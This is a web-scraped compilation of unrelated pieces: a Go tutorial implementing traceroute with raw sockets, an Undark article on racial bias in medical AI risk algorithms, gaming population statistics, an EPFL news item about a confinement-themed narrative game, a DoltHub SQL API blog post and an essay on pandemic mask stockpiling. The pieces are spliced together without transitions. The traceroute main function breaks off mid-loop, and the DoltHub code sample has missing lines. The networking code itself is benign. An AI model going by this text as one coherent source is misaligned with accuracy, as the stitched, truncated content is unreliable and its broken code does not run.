When a server/router drops a packet, it returns a  <code>ICMP Time Exceeded</code> message back. Parsing this message will allow us to retrieve info on the particular hop. Once the destination is reached (last hop) we are returned a <code>ICMP Destination Unreachable</code> message.</p>
<hr>
<h3 id="implementing-traceroute">Implementing traceroute</h3>
<p>Now that we understand what’s happening under the hood, we can roughly design a way to implement traceroute.
The steps to implement it should look something like this:</p>
<ul>
<li>Open a socket connection between us and our destination and send UDP packets</li>
<li>Start from TTL=1 and keep increasing the TTL value on the UDP packets</li>
<li>Open a socket that listens for the ICMP messages and parses them</li>
</ul>
<hr>
<h3 id="writing-a-go-application-that-implements-traceroute">Writing a Go application that implements traceroute</h3>
<p>Now we know what we want and all we need to do is implement it in any language. I’m implementing this in Go. The <code>net</code> and <code>syscall</code> package will help us along the way.</p>
<p><em>Note: I will be using minimal code just to show the main implementation (so you probably wont see me handling errors, etc here). For a more refinded well developed version of this code check out <a href="https://github.com/kalbhor/tracesite">the repository</a>.</em></p>
<p>Lets start by creating the sockets we’ll use for sending and recieving data.</p>
<pre><code>sendSocket, err := syscall.Socket(syscall.AF_INET, syscall.SOCK_DGRAM, syscall.IPPROTO_UDP)
recvSocket, err := syscall.Socket(syscall.AF_INET, syscall.SOCK_RAW, syscall.IPPROTO_ICMP)
defer syscall.Close(recvSocket)
defer syscall.Close(sendSocket)
</code></pre><p>Lets create a ttl variable which we’ll iterate and a timevalue variable that defines our timeout</p>
<pre><code>ttl := 1
// For 2000Ms
tv := syscall.NsecToTimeval(1000 * 1000 * (int64)(2000)) 
</code></pre><p>Next lets set the ttl and timeout value for the packets we’ll send in the socket</p>
<pre><code>syscall.SetsockoptInt(sendSocket, 0x0, syscall.IP_TTL, ttl)
syscall.SetsockoptTimeval(recvSocket, syscall.SOL_SOCKET, syscall.SO_RCVTIMEO, &amp;tv)
</code></pre><p>At this point our sockets are ready to send and recieve data. What we need to do is find the destination address for our <code>sendSocket</code> and a network interface on our machine for our <code>recvSocket</code></p>
<pre><code>func socketAddr() ([4]byte, error) {
    socketAddr := [4]byte{0, 0, 0, 0}
    addrs, err := net.InterfaceAddrs()
    if err != nil {
        return socketAddr, err
    }

    for _, a := range addrs {
        if ipnet, ok := a.(*net.IPNet); ok &amp;&amp; !ipnet.IP.IsLoopback() {
            if len(ipnet.IP.To4()) == net.IPv4len {
                copy(socketAddr[:], ipnet.IP.To4())
                return socketAddr, nil
            }
        }
    }
    err = errors.New("Not connected to the Internet")
    return socketAddr, err
}

func destAddr(dest string) ([4]byte, error) {
    destAddr := [4]byte{0, 0, 0, 0}
    addrs, err := net.LookupHost(dest)
    if err != nil {
        return destAddr, err
    }
    addr := addrs[0]

    ipAddr, err := net.ResolveIPAddr("ip", addr)
    if err != nil {
        return destAddr, err
    }
    copy(destAddr[:], ipAddr.IP.To4())
    return destAddr, nil
}
</code></pre><p>And in our main function we use these functions the get the addresses our sockets will use</p>
<pre><code>destAddr, err := destAddr("google.com")
socketAddr, err := socketAddr()
</code></pre><p>Lets bind our <code>recvSocket</code> so that it can recieve messages and lets send a null byte to our destination through our <code>sendSocket</code>. We connect to the port 33434.</p>
<pre><code>syscall.Bind(recvSocket, &amp;syscall.SockaddrInet4{Port: 33434, Addr: socketAddr})
syscall.Sendto(sendSocket, []byte{0x0}, 0, &amp;syscall.SockaddrInet4{Port: 33434, Addr: destAddr})
</code></pre><p>Now we need to parse the messages being sent on our <code>recvSocket</code></p>
<pre><code>p := make([]byte, options.Int(56)) // The integer here is the packet size
n, from, err := syscall.Recvfrom(recvSocket, p, 0)

ip := from.(*syscall.SockaddrInet4).Addr
ipString := fmt.Sprintf("%v.%v.%v.%v", ip[0], ip[1], ip[2], ip[3])
host, err := net.LookupAddr(ipString)

fmt.Println(host)
fmt.Println(ipString)
</code></pre><p>The Recvfrom method returns a <code>Sockaddr</code> type to our <code>from</code> variable. Hence if we parse our <code>from</code> variable we can get the IP info on the hop. We can use this with <code>net.LookupAddr</code> to run a reverse search and get the hostname (domain name) through the IP.</p>
<p>We’re almost done! All we need to do is wrap this functionality in a for loop and keep updating the <code>ttl</code> variable.</p>
<pre><code>func main() {
    sendSocket, err := syscall.Socket(syscall.AF_INET, syscall.SOCK_DGRAM, syscall.IPPROTO_UDP)
    recvSocket, err := syscall.Socket(syscall.AF_INET, syscall.SOCK_RAW, syscall.IPPROTO_ICMP)
    defer syscall.Close(recvSocket)
    defer syscall.Close(sendSocket)

    ttl := 1
    tv := syscall.NsecToTimeval(1000 * 1000 * (int64)(2000)) // For 2000Ms

    for {
        syscall.SetsockoptInt(sendSocket, 0x0, syscall.IP_TTL, ttl)
        syscall.SetsockoptTimeval(recvSocket, syscall.SOL_SOCKET, syscall.SO_RCVTIMEO, &amp;tv)

        destAddr, err := destAddr("google.com")
        socketAddr, err := socketAddr()
        destAddrString := fmt.Sprintf("%v.%v.%v.%v", destAddr[0], destAddr[1], destAddr[2], destAddr[3]) 


        syscall.Bind(recvSocket, &amp;syscall.SockaddrInet4{Port: 33434, Addr: socketAddr})

<p>July 27, 2020 by <a href="https://undark.org/undark-author/rod-mccullom/">Rod McCullom</a></p>



<p>The power of artificial intelligence has transformed health care by using massive datasets to improve diagnostics, treatment, records management, and patient outcomes. Complex decisions that once took hours — such as making a breast or lung cancer diagnosis based on imaging studies, or deciding when patients should be discharged — are now resolved within seconds by machine learning and deep learning applications.</p>



<p>Any technology, of course, will have its limitations and flaws. And over the past few years, a steady stream of evidence has demonstrated that some of these AI-powered medical technologies are <a href="https://www.forbes.com/sites/insights-intelai/2019/02/11/rethinking-medical-ethics/#408d1cce6f03">replicating</a> racial bias and <a href="https://www.nature.com/articles/d41586-019-02872-2">exacerbating</a> historic health care inequities. Now, amid the SARS-CoV-2 pandemic, some researchers are asking whether these new technologies might be contributing to the <a href="https://www.hopkinsmedicine.org/health/conditions-and-diseases/coronavirus/covid19-racial-disparities">disproportionately</a> high rates of virus-related illness and death among African Americans. African Americans aged 35 to 44 experience Covid-19 mortality rates that are <a href="https://cdn1.sph.harvard.edu/wp-content/uploads/sites/1266/2020/06/20_Bassett-Chen-Krieger_COVID-19_plus_age_working-paper_0612_Vol-19_No-3_with-cover.pdf">nine times higher</a> than their White counterparts. Many African Americans also say they have <a href="https://www.washingtonpost.com/graphics/2020/politics/coronavirus-race-african-americans/">limited access</a> to Covid-19 testing.</p>



<p>During the early weeks of the pandemic, <a href="https://www.bet.com/news/national/2020/04/29/coronavirus-retail-testing-sites-african-american-communities-fail.html">there were</a> few — if any — Covid-19 testing locations in African American communities. Public health officials in states such as <a href="https://www.npr.org/sections/health-shots/2020/05/03/849243723/californias-coronavirus-testing-still-a-frustrating-patchwork-of-haves-and-have">California</a>, <a href="https://www.nbcchicago.com/news/local/lightfoot-announces-6-new-testing-sites-in-chicago/2270017/">Illinois</a>, <a href="https://healthitanalytics.com/news/leveraging-covid-19-data-to-eliminate-healthcare-disparities">Tennessee</a>, and <a href="https://www.npr.org/sections/health-shots/2020/05/27/862215848/across-texas-black-and-hispanic-neighborhoods-have-fewer-coronavirus-testing-sit">Texas</a> have said that decisions about whom and where to test were data-driven and reflected the demographics of early cases. Yet the initial focus on affluent White communities allowed thousands of infections to quickly spread across cities and towns whose residents experience disproportionately high rates of <a href="https://www.cdc.gov/coronavirus/2019-ncov/need-extra-precautions/racial-ethnic-minorities.html">underlying health conditions</a>.</p>



<p>African American communities should have been prioritized for testing locations, says Alondra Nelson, a sociologist and president of the <a href="https://www.ssrc.org/about/who-we-are/">Social Science Research Council</a>, an almost 100-year-old independent research organization that advances better understanding of social science. When algorithms overlooked health disparities as a risk factor, Nelson says, public health officials issued an implicit statement to African American communities: “We’re not going to triage and treat you.”</p>



<p>Those who study the problem say that the extent of racial bias in AI medical technologies is unknown. This is, in part, due to a lack of transparency: The software is often proprietary, which means the intellectual property — the process, inputs, and source coding — is protected and copyrighted. Independent researchers have very little, if any, access to the data. “We’re in a new space,” says Nelson. In many instances, big data is now a business product. This is why she and others say that fixing racial bias in AI may involve addressing not just science, but also policy and law.</p>



<p>The stakes are high. Algorithms affect the lives of virtually all Americans, making <a href="https://www.jdsupra.com/legalnews/alert-ai-and-algorithms-ftc-issues-59515/">rapid, automated decisions</a> in <a href="https://www.marketwatch.com/story/ai-based-credit-scores-will-soon-give-one-billion-people-access-to-banking-services-2018-10-09">credit</a>, finance, <a href="https://www.vox.com/recode/2019/12/12/20993665/artificial-intelligence-ai-job-screen">employment</a>, compensation, <a href="https://www.curbed.com/2019/12/17/21026311/mortgage-apartment-housing-algorithm-discrimination">housing</a>, <a href="https://www.nytimes.com/2020/02/06/technology/predictive-algorithms-crime.html">courts and sentencing</a>, health, medicine, and other areas. These decisions are critical to our daily lives, and they are largely automated.</p>



<hr>



<p>Last fall, a research team published a <a href="https://science.sciencemag.org/content/366/6464/447.full">paper</a> in the journal Science that for the first time attempted to quantify the extent of racial bias in patient care and outcomes. The researchers studied an algorithm developed by Optum, a subsidiary of the world’s largest health care company, UnitedHealth Group.&nbsp;Other companies, such as 3M Health Information Systems and Verisk Health, <a href="https://www.soa.org/globalassets/assets/Files/Research/research-2016-accuracy-claims-based-risk-scoring-models.pdf">produce</a> similar algorithms, as do some universities and the Centers for Medicare and Medicaid Services.</p>



<p>The algorithm under study was used to identify patients with complex medical needs and assign each what is known as a “risk score.” Patients with the highest scores are eligible for additional resources, such as home visits by a nurse, expedited primary care visits, and automatic prescription refills. The research team looked at how the algorithm performed at an unnamed medical center, which provided the health care records for nearly 50,000 patients. Almost 44,000 were White and about 6,000 were Black. Researchers compared the patients’ risk scores with their actual health data, including illness history and test results.&nbsp;</p>



<p>The way the medical center used the algorithm, the researchers concluded, was not neutral and unbiased. African Americans, for example, comprised just 18 percent of the medical center’s high-risk group when assessed using the algorithm. But when looking at actual patient health data, the Science researchers concluded the high-risk group should have been 47 percent African American. The discrepancy meant that White patients were granted access to resources ahead of African American patients who were less healthy.</p>



<p>The reason: The algorithm was trained to identify patients with higher anticipated future health care costs. It may seem reasonable to equate higher anticipated costs with deteriorating health, says the study’s lead author, <a href="https://publichealth.berkeley.edu/people/ziad-obermeyer/">Ziad Obermeyer</a>, an emergency medicine physician and an associate professor at the University of California, Berkeley School of Public Health. But the formula privileges patients with higher incomes and top tier health insurance plans that cover preventive care, more doctor visits, higher cost prescriptions and such. It also ignores the reality that many low-income patients — who are disproportionately African American — are more likely to seek medical care only when their symptoms are severe.</p>



<p>The result: Poorer Black patients appear healthier than they actually are.&nbsp;</p>



<figure id="promo-table"><table><tbody><tr><td><img src="https://undark.org/wp-content/uploads/2020/03/cv19.png" width="80px"></td><td><br><em>For all of Undark’s coverage of the global Covid-19 pandemic, please visit our extensive <a href="https://sinapticas.com/covid19">coronavirus archive</a>.</em></td></tr></tbody></table></figure>



<p>What’s “so striking” and “sadly very familiar” are that these algorithms are mimicking the structural racism evident across American society and in health care, says Obermeyer. These types of screening algorithms should “identify people who have the same health needs irrespective of the color of their skin,” Obermeyer adds. “That turns out not to be the case.”&nbsp;</p>



<p>In an email to Undark, Optum spokesperson Tyler Mason took issue with the Science analysis. “The study in question grossly mischaracterized a cost-prediction algorithm . . . based on one health system’s incorrect use of it, which was completely inconsistent with any recommended use of the tool.” That recommended use, according to Optum, is to model potential future health care costs for individual patients based on past health care experiences. It is not intended to assist doctors in making care decisions. The algorithm “does not result in racial bias when used for that purpose,” Mason added.</p>



<p>Obermeyer agreed that the algorithm is not racially biased when used as a predictor of cost. “It predicts cost equally well for Black and White patients,” he wrote in an email. But he disagreed with the implication that just one hospital was misusing the algorithm. “On the one hand, everyone knew it was a cost predictor; on the other hand, everyone was very obviously using it to predict risk,” he wrote. As Obermeyer sees it, the problem was systemic: Software developers, hospitals, insurers, researchers — “we were all just thinking about this . . . in a way that was subtly but importantly wrong.”</p>



<p>Because risk-prediction algorithms are widely used, some researchers are now asking if their use contributed to the significant racial disparities seen in Covid-19 treatment and access to testing.</p>



<p>The narrative around Covid-19 and African Americans has largely been about comorbidities, says Nelson. As a group, African Americans experience <a href="https://minorityhealth.hhs.gov/omh/browse.aspx?lvl=4&amp;lvlid=18">higher rates</a> of many serious health problems, including hypertension and diabetes. These conditions make people <a href="https://www.cdc.gov/coronavirus/2019-ncov/need-extra-precautions/people-with-medical-conditions.html">more vulnerable</a> to Covid-19. “If we know that African Americans are more likely to have poor health outcomes because they have these comorbidities,” says Nelson, then they, as well as Latinos and Indigenous people, should have been prioritized for testing.</p>



<p>But that doesn’t appear to have happened. Nelson points to “lots of stories of people who have gone to the hospitals and emergency rooms <a href="https://www.cbsnews.com/news/rana-zoe-mungin-brooklyn-teacher-coronavirus-dies-denied-testing/">two</a>, three, <a href="https://www.nbcnews.com/news/us-news/detroit-health-care-worker-dies-after-being-denied-coronavirus-test-n1192076">four times</a>,” and still testing was denied because “it was not believed that they were sick enough. These were African Americans who had Covid-19” and some later died, she adds.</p>



<p>Obermeyer recently spent time working at a hospital in Navajo Nation, a Native American reservation with some of the <a href="https://www.bbc.com/news/world-us-canada-52941984">highest</a> per capita Covid-19 infection rates in the United States. Navajo Nation’s health care infrastructure is “under-resourced,” says Obermeyer, and that can create a vicious cycle, similar to the one his team uncovered in their study of the AI-powered algorithm: If an underserved population lacks access to Covid-19 testing, then that population might look like it’s doing relatively well, even when it isn’t. This, in turn, may lead to fewer resources being allocated — and a delayed understanding of the full scope of the problem.</p>



<hr>



<p>Racial bias has also been demonstrated in AI-powered medical diagnostic applications with a very particular nuance: The algorithms are less accurate diagnosing conditions on darker skin.&nbsp;</p>



<p><a href="https://undark.org/2017/05/17/facial-recognition-technology-biased-understudied/">The phenomenon is not new</a>. Facial recognition systems used by law enforcement, for example, are notoriously less accurate at identifying African American faces. Some of the relatively few studies documenting the problem have suggested up to 10 percent less accuracy compared to White faces. Self-driving auto technologies are also <a href="https://arxiv.org/abs/1902.11097">less accurate</a> at recognizing pedestrians with darker skin — a situation that could have fatal consequences.</p>



<p>In medicine, machine learning has been used to create programs capable of distinguishing between images of benign and malignant moles. But a 2018 paper in <a href="https://jamanetwork.com/journals/jamadermatology/article-abstract/2688587">JAMA Dermatology</a> warned that “no matter how advanced the [machine learning] algorithm, it may underperform on images of lesions in skin of color.” This is because the training sets for the algorithms are not diverse, says <a href="https://dellmed.utexas.edu/directory/ade-adamson">Adewole Adamson</a>, a dermatologist and assistant professor at …</p></div></div>

<p>By mid-2020, the number of people playing video games had grown to 3.1 billion, according to <a href="https://www.dfcint.com/product/video-game-consumer-segmentation-2/">DFC Intelligence</a>. Considering that in July the total population of the Earth exceeded 7.8 billion, just under 40% are familiar with games.</p>




<p>Analysts point out that almost half of the accounted three billion are those who play only on smartphones or mobile devices. This segment is also ahead of all others in terms of growth.</p>



<p>However, only about 250 million people are active console users who regularly buy new games for them. Although they represent only 8% of the total number of gamers, this is the group with the highest revenue per person.</p>



<p>1.5 billion are playing on PC – 48% of all gamers. However, this number includes not only regular users but also those who also enjoy video games on consoles and mobile platforms.</p>



<p>More than half of the world’s gamers live in Asia – there are 1.42 billion players there. Moreover, this region also accounts for 53% of people who play only on smartphones. The top four also include Europe (668 million), Latin America (383 million) and North America (261 million).</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><p> An interactive video game created by researchers and students in the EPFL College of Humanities (CDH) and UNIL Gamelab, in collaboration with the Initiative for Media Innovation (IMI) and Le Temps, allows users to explore a series of digital narratives that bear witness to the period of pandemic-induced isolation.<br></p><div id="news-content-text" itemprop="description"><p>Would you let your children play in the park? How can you stay focused during your distance-learning course? Who are you going to call to pass the time while semi-confined? People across the world are dealing with these questions, and many more, as social distancing and confinement have become key strategies for fighting the coronavirus pandemic.</p><p>For <a href="https://www.epfl.ch/schools/cdh/">CDH</a> scientist and <a href="https://wp.unil.ch/gamelab/">UNIL Gamelab</a> researcher Yannick Rochat, an expert in game studies and digital humanities, a narrative video game seemed like a natural medium for exploring these questions, and how different people struggle to respond to them in different ways.</p><p>“Video games can convey information as well as emotions. The idea behind this game is to have a testimony to this period in history that has impacted us all. For a newspaper like <em>Le Temps</em> and for a researcher like myself, it is important to document and keep an account of these experiences,” he says.</p><p>On August 20<sup>th</sup>, Rochat and a team of collaborators from the worlds of gaming, programming, and graphic design released “<a href="https://labs.letemps.ch/interactive/2020/quatre-apparts-un-confinement/">Quatre apparts et un confinement</a>” (Four Condos and a Containment): a series of interactive, choose-your-own-adventure stories that dramatize the lives of four fictitious neighbors in the same building.</p><p><strong>Confinement through the eyes of others</strong></p><p>The francophone game was developed in June and July, 2020, thanks to the (socially distanced) collaboration of <a href="https://www.media-initiative.ch/">IMI</a> Director Mounir Krichane, <em>Le Temps</em> journalist Paul Ronga, graphic designer Mathias Hängärtner, EPFL student Andrew Dobis, and UNIL student Saara Jones. It is hosted on <em>Le Temps’</em> website and mobile app.</p><p>Users can click through the digital apartments, visiting each character and participating briefly in their lives: their decisions, their worries, their desires, or their frustrations. Some experiences may seem familiar to users, while some present a window into what others may be feeling during confinement.</p><p>“This video game allows us to tell the story of confinement from different angles, while allowing the player to participate. This represents an important opportunity to relive confinement, but from the perspective of another person – for example, a single mother, an elderly woman, or a student,” Rochat explains. He adds that the mobile-friendly, point-and-click format was inspired in part by narrative video games like <a href="https://annapurnainteractive.com/games/florence/">Florence</a>, but with the added complexity of text and dialogue.</p><p>IMI Director Mounir Krichane also explains that beyond the game’s instructive aspect, which reflects educational offerings <a href="http://isa.epfl.ch/imoniteur_ISAP/!itffichecours.htm?ww_i_matiere=2708194715&amp;ww_x_anneeAcad=1866895046&amp;ww_i_section=116995070&amp;ww_i_niveau=2936295&amp;ww_c_langue=en">at EPFL</a> and <a href="https://applicationspub.unil.ch/interpub/noauth/php/Ud/ficheCours.php?v_enstyid=79083&amp;v_blocid=&amp;v_ueid=174&amp;v_langue=en&amp;v_isinterne=">at UNIL</a> on video games, “Quatre apparts” is also a way for IMI and its partners to explore new modes of storytelling, including interactive formats.</p><p>“With most media organizations now facing the question of audience renewal, interactive formats are a way to remain relevant to changing audiences while also attracting new ones, especially among younger generations,” he says.</p><p>Thanks to its <a href="https://github.com/IMI-initiative/quatre-apparts-et-un-confinement">open-source code</a>, the creators also emphasize that other media and institutions are invited to publish or adapt the unique gaming experience, for example into other languages.</p></div></div>]]>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div data-cy="blog-post-text"><p><a href="https://doltdb.com/">Dolt</a> is <a href="https://www.dolthub.com/blog/2020-03-06-so-you-want-git-for-data/">Git for data</a>,
a relational database built to create, publish and consume datasets.
<a href="https://www.dolthub.com/">DoltHub</a> hosts a growing collection of public open datasets stored as Dolt databases.
Dolthub allows you explore data through its SQL <a href="https://www.dolthub.com/repositories/Liquidata/nba-players/query/master?q=SELECT%20full_name%2C%20abbreviation%2C%20year_founded%20FROM%20%60teams%60%20LIMIT%20200%3B&amp;active=Tables">query interface</a>.
We're excited to announce that you can now query Dolthub datsets via the SQL API. </p>
<h2>How it works</h2>
<p>Dolthub's SQL API exposes repository data via an HTTP endpoint at <code>www.dolthub.com/api/v1alpha1</code>.
Query parameters are encoded in the URL in the form of:</p>
<div data-language="text"><pre><code>https://www.dolthub.com/api/v1alpha1/&lt;owner_name&gt;/&lt;repo_name&gt;/&lt;branch_name&gt;?q=&lt;sql_query&gt;</code></pre></div>
<p>The &lt;sql_query&gt; is specified as a query string keyed by "q". Any valid SQL read query is acceptable.</p>
<h2>An Example</h2>
<p>Basketball is back y'all!
The NBA bubble is fully inflated and sports fans out there are getting a much appreciated distraction from the day-to-day.</p>
<p><img src="https://www.dolthub.com/blog/2fdc8439bb19fa2e316349efbd30c89f/dame.gif" alt="It's Dame Time!"></p>
<p>The NBA hit pause on the regular season all the way back in March, so let's check out Dolthub's
<a href="https://www.dolthub.com/repositories/Liquidata/nba-players"><code>nba-players</code></a> dataset and figure out where we left off.
We'll use Python's <code>requests</code> library as a simple way to hit the API.</p>
<div data-language="python"><pre><code><span>&gt;&gt;</span><span>&gt;</span> <span>import</span> requests
<span>&gt;&gt;</span><span>&gt;</span> owner<span>,</span> repo <span>=</span> <span>'Liquidata'</span><span>,</span> <span>'nba-players'</span>

     <span>'schema'</span><span>:</span> <span>[</span>
            <span>{</span><span>'columnName'</span><span>:</span> <span>'Table'</span><span>,</span><span>'columnType'</span><span>:</span> <span>'String'</span><span>,</span><span>'isPrimaryKey'</span><span>:</span> <span>False</span><span>}</span>
        <span>]</span><span>,</span> 
     <span>'rows'</span><span>:</span> <span>[</span>
            <span>{</span><span>'Table'</span><span>:</span> <span>'career_totals_allstar'</span><span>}</span><span>,</span> 
            <span>{</span><span>'Table'</span><span>:</span> <span>'career_totals_post_season'</span><span>}</span><span>,</span> 
            <span>{</span><span>'Table'</span><span>:</span> <span>'career_totals_regular_season'</span><span>}</span><span>,</span> 
            <span>.</span><span>.</span><span>.</span>
        <span>]</span>
<span>}</span></code></pre></div>
<p>The response gives some general metadata about the query as well as the schema of the query and its result rows.
A couple things to note here: &lt;branch_name&gt; and &lt;sql_query&gt; are optional parameters.
If they're not specified they default to 'master' and 'SHOW TABLES' respectively.
The nba-players dataset includes all of this season's stat totals up to the March stoppage.
Let's find out who's leading the league in scoring. </p>

<p>This is a great example of the power of the SQL API.
You can execute joins against that API rather than having to fetch all the data and compute the matches yourself.</p>
<p>Why Harden is a distant third in the MVP race... we'll never know.
Speaking of Harden getting robbed, back in December this <a href="https://www.dolthub.com/blog/3e540a6d7ace830b78359178d9eb2afe/harden.mp4">happened</a>.
Harden's dunk wasn't counted and could not be overturned with video replay. (The Rockets went on to lose in double OT.)
Thankfully Liquidata has corrected the record on a <a href="https://www.dolthub.com/repositories/Liquidata/nba-players/compare/james-harden-basket-counts/asp1h2qhi1k8otrnk5o6jv87doahqn7v">separate branch</a> within this repo.

<p>The flexibility of the SQL API allows you to do anything you want with your data.
You can use the API to fetch data for visualization or as a simple backend for web app.
The SQL API is currently in alpha.
It's shape may change over time, but the basic principle of data access through SQL will remain.
The API is built of top of Dolt's SQL engine powered by <a href="https://github.com/liquidata-inc/go-mysql-server"><code>go-mysql-server</code></a>
so it's performance and compatibility are improving on a weekly basis.

<hr>
<p><span>I heard a story recently about 3M (</span><a href="https://www.dictionary.com/e/acronyms/h-t/"><span>h/t</span></a><span>: frequent commenter Boonton). Supposedly, back during the SARS outbreak they decided they should build in some “surge capacity” around the construction of N95 masks. Enough additional capacity that they could double their production at a moment’s notice. It was unclear if they actually did that or if they were just thinking about it. And even if they had, it appears that the scope of the current crisis is great enough that it’s not as if this one decision would have dramatically altered the outcome. Still it’s hard to dispute that it would have helped.&nbsp;</span></p>
<p><span>The question which immediately suggests itself is how would the market have treated this development? In fact imagine that there were two companies, one who took some portion of their profits and plowed them back into various measures which would help in the event of a crisis and one that didn’t. How do you imagine that the stock market and investors would price these two companies? I’m reasonably certain that the latter, the one who took the profits and disbursed them as dividends, or found some other use for them, would end up with a higher valuation, all else being equal. In other words I would very much expect Wall Street to have punished 3M for this foresight, particularly over a sufficiently long time horizon where there were no additional epidemics, but even in the few years between doing it and needing it.</span></p>
<p><span>What this story illustrates is that attempts to maximize the efficiency of an economic system also have the effect of increasing and possibly maximizing the fragility as well. And while, in general, I don’t have much to say about the Coronavirus which hasn’t been said already and better by someone else. I do think that this may be one of the few areas where not enough has been said already and where I might, in fact, have something useful to add to the discussion.&nbsp;</span></p>
<p><span>To begin, I want to turn from examining the world we have to looking at the world we wished we had, at least with respect to the virus. And as long as we’re already on the subject of masks we might as well continue in this vein.&nbsp;</span></p>
<p><span>As the pandemic progresses one of the big things people are noticing is the difference in the number of infections between the various countries. In particular South Korea, Japan and Taiwan have done much better than places like Italy and Spain. There are of course a number of reasons for why this might be, but there’s increasing anecdotal evidence indicating that the availability of masks might be one part of the equation.&nbsp;</span></p>
<p><span>For example, Taiwan is very closely connected to China, and one might expect that they would have gotten the virus quite early. Probably before people really understood what was going on, but definitely well before the recent policies of social distancing really started to be implemented to say nothing of a full on quarantine, and yet somehow, they only have 235 infections, which as of this writing puts them below Utah!</span></p>
<p><span>There are of course numerous reasons for why this might be, but I’m more and more inclined to believe that one big factor is that Taiwan is a mask producing juggernaut. In fact as recently as a few days ago they pledged to send </span><a href="https://www.taiwannews.com.tw/en/news/3899531"><span>100,000 masks a week to us</span></a><span>. They can make this gesture (and I know 100k is actually just a drop in the bucket) because they’re currently producing </span><a href="https://focustaiwan.tw/business/202003090013"><span>10 million masks a day</span></a><span>! For a country that only has 24 million people. Meaning that while that won’t quite cover one mask per day per person it’s enough that if people avoid leaving the house unnecessarily and if some masks can be reused they have enough for everyone to be wearing one at all times when they’re out of doors.</span></p>
<p><span>South Korea is similar and the big challenge there was not that they weren’t producing enough masks, but to </span><a href="https://abcnews.go.com/International/south-korea-takes-measures-face-masks-domestically-amid/story?id=69254114"><span>stop exporting the masks</span></a><span> they were already making. Finally reports out of Japan indicate that about 95% of people are wearing masks. But more importantly reports were that even before the pandemic around 30-40% were wearing masks just as a matter of habit. Is it possible that this slowed things down enough to allow them to get on top of it once the true scale of the crisis was apparent?</span></p>
<p><span>As I was writing this post I did some research on the topic, but before the post was finished Scott Alexander of Slate Star Codex came along, as he frequently does, and released </span><a href="https://slatestarcodex.com/2020/03/23/face-masks-much-more-than-you-wanted-to-know/"><span>Face Masks: Much More Than You Wanted to Know</span></a><span> which is a very thorough examination of the mask question. What he found mostly supports my point, and in particular this story was fascinating:</span></p>
<p><em><span>Some people with swine flu travelled on a plane from New York to China, and many fellow passengers got infected. Some researchers </span></em><a href="https://www.ncbi.nlm.nih.gov/pmc/articles/PMC3810906/"><em><span>looked at whether</span></em></a><em><span> passengers who wore masks throughout the flight stayed healthier. The answer was very much yes. They were able to track down 9 people who got sick on the flight and 32 who didn’t. 0% of the sick passengers wore masks, compared to 47% of the healthy passengers. Another way to look at that is that 0% of mask-wearers got sick, but 35% of non-wearers did. This was a significant difference, and of obvious applicability to the current question.</span></em></p>
<p><span>On the other hand, when we turn to the US and Europe, in contrast to Southeast Asia, there is definitely not a culture of mask-wearing and even if there had been, most of those countries apparently imported masks from places like Taiwan and China (a point I’ll return to) meaning that when those countries stopped exporting masks there were even fewer available here, enough that people started worrying about not having even enough for the healthcare providers. Once this problem became apparent various authorities started telling people that masks were ineffective. A policy which has since been called out for not merely being wrong, but </span><a href="https://www.nytimes.com/2020/03/17/opinion/coronavirus-face-masks.html"><span>contradictory, counterproductive and undermining trust in the authorities at a time when they needed it most.</span></a><span>&nbsp;</span></p>
<p><span>For most people, myself included, it’s just common sense that wearing a mask helps, the only question is how much? Based on evidence out of the countries just mentioned, and the SSC post I would venture to say that they help quite a bit. Also they’re cheap. Particularly when weighed against the eventual cost of this pandemic.</span></p>
<p><span>We’ve all learned many new things since the pandemic began, one of the things I didn’t realize was how bad the </span><a href="https://en.wikipedia.org/wiki/Severe_acute_respiratory_syndrome"><span>SARS</span></a><span> epidemic was and how much the current precautions and behavior of the Southeast Asian countries is based on l</span><a href="https://www.ncbi.nlm.nih.gov/pmc/articles/PMC3320446/"><span>essons learned during that epidemic</span></a><span>. And while it’s understandable that I might have missed that (particularly since I didn’t start blogging until 2016) the CDC and the federal government on the other hand should have been paying </span><em><span>very close attention</span></em><span>. In fact, you would have expected that they might have taken some precautions in case something like that happened again or worse, started in the US. (Though to be fair, we don’t have wet markets, if that is where it started. As if we didn’t already have enough conspiracy theories.) Instead the US Government’s response has been borderline criminal. (Other people have done a much better job of talking about this than I could, but if you’re interested in a fairly short podcast just about the delay of testing that avoids sensational accusations, check out this </span><a href="https://www.npr.org/2020/03/18/818072542/episode-981-how-to-test-a-country"><span>Planet Money episode</span></a><span>.)</span></p>
<p><span>To continue using the example of masks, I think it’s worth asking what it would have taken for the government to have a one month supply for every single person in the country. Stockpiled against a potential pandemic. According to this </span><a href="https://www.wired.com/story/covid-19-amazon-curb-face-mask-price-gouging/"><span>Wired article</span></a><span>, before the pandemic 100 disposable masks were going for $3.75, let’s be conservative and round up and say that masks cost 4 cents a piece. From there the math is straightforward: 330 million people X 30 days X $0.04, is ~$400 million dollars, or 3% of the CDCs budget, or less than what the federal government spends in an hour. Still, I’ll agree, that’s a fair amount of money. But remember that’s the </span><em><span>absolute maximum</span></em><span> it would cost. I’d actually be surprised if once you factored in the huge economy of scale that we couldn’t do it for a 10th of that or even a 20th of that. And it would presumably have been cheaper still to just buy the necessary machinery for making masks and then mothball it, with a “break in case of emergency” sign on the door. Once you factor in all the potential cost savings, it’s hard to imagine that this would have cost more than $25 million (in fact if the government wants to offer me a $25 million contract to make it happen for next time I would be happy to take it.) And when you consider that it’s probably going to end up costing the US over a </span><a href="https://www.weforum.org/agenda/2020/03/coronavirus-covid-19-cost-economy-2020-un-trade-economics-pandemic/"><span>trillion dollars</span></a><span>, plus the expected odds of something like this happening, you start to wonder why on earth they didn’t do this </span><em><span>and countless other things</span></em><span> that might have come in handy. (A strategic toilet paper reserve? I’m just saying.)</span></p>
